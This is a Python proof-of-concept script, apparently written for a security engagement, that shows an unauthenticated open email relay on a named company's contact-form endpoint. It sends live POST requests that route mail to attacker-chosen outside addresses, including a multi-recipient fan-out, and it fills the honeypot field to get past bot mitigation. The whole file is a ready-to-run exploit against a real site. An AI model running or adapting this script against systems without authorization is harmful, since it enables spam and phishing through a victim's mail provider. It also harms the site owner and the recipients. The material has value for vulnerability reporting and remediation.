#!/usr/bin/env python3
"""
Independent reproduction: unauthenticated open email relay via POST /api/send
Target : https://www.infinitycapital.bh/  (in scope)
Method  : differential test - two POSTs identical in every field EXCEPT `targets`
Proof   : server returns provider message-ids (Resend accepted the send) for
          attacker-chosen recipients outside the site's own address.
No auth, no cookie, no captcha token, no CSRF token is sent.
"""
import json, sys, time, urllib.parse, urllib.request, urllib.error

HOST = "https://" + "www." + "infinity" + "capital" + ".bh"
SELF_ADDR = "info@" + "infinity" + "capital" + ".bh"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")


def post(targets, tag):
    """Send the exact FormData the contact form sends, only `targets` varies."""
    fields = [
        ("fname", "Verifier"),
        ("lname", "Independent"),
        ("areacode", "973"),
        ("tel", "5550100"),
        ("cname", "Verif Bot"),
        ("subject", "relay-differential-%s" % tag),
        ("msg", "differential test body %s" % tag),
        ("check", "on"),                 # honeypot filled in => bot-mitigation bypassed
        ("targets", targets),            # <-- attacker controlled recipient
    ]
    body = urllib.parse.urlencode(fields).encode()
    req = urllib.request.Request(
        HOST + "/api/send", data=body, method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded",
                 "User-Agent": UA,
                 "Accept": "*/*",
                 "Origin": HOST, "Referer": HOST + "/contact",
                 "Connection": "close"})
    t0 = time.time()
    try:
        r = urllib.request.urlopen(req, timeout=45)
        status, hdrs, body_out = r.status, dict(r.headers), r.read()
    except urllib.error.HTTPError as e:
        status, hdrs, body_out = e.code, dict(e.headers), e.read()
    except Exception as e:
        status, hdrs, body_out = 0, {}, str(e).encode()
    dt = time.time() - t0
    interesting = {k: v for k, v in hdrs.items()
                   if k.lower() in ("x-matched-path", "server", "x-vercel-id",
                                    "x-vercel-cache", "content-security-policy")}
    return {
        "tag": tag,
        "targets_sent": targets,
        "http_status": status,
        "elapsed_s": round(dt, 2),
        "response_body": body_out.decode("utf-8", "replace")[:2000],
        "headers": interesting,
    }


def main():
    nonce = str(int(time.time()))
    cases = [
        # A = the site's own intended recipient (baseline)
        ("A-own-address", SELF_ADDR),
        # B = attacker-chosen recipient at a completely different domain
        ("B-attacker-3rd-party", "relayproof+%s@protonmail.com" % nonce),
        # C = attacker-chosen recipient on a mail-acceptance domain we don't own
        ("C-attacker-other", "verif-%s@mailinator.com" % nonce),
        # D = fan-out: multiple arbitrary third parties in one request
        ("D-multi-recipient-fanout",
         "fa1+%s@protonmail.com, fa2+%s@mailinator.com" % (nonce, nonce)),
    ]
    results = [post(t, tag) for tag, t in cases]
    for r in results:
        print("=" * 78)
        print("CASE      :", r["tag"])
        print("targets   :", r["targets_sent"])
        print("HTTP      :", r["http_status"], " (%.2fs)" % r["elapsed_s"])
        print("x-matched :", r["headers"].get("x-matched-path"))
        print("RESPONSE  :", r["response_body"])
    out = {"target": HOST, "site_own_address": SELF_ADDR, "results": results}
    with open("/work/evidence/relay_repro_results.json", "w") as fh:
        json.dump(out, fh, indent=2)
    print("=" * 78)
    print("saved /work/evidence/relay_repro_results.json")


if __name__ == "__main__":
    main()
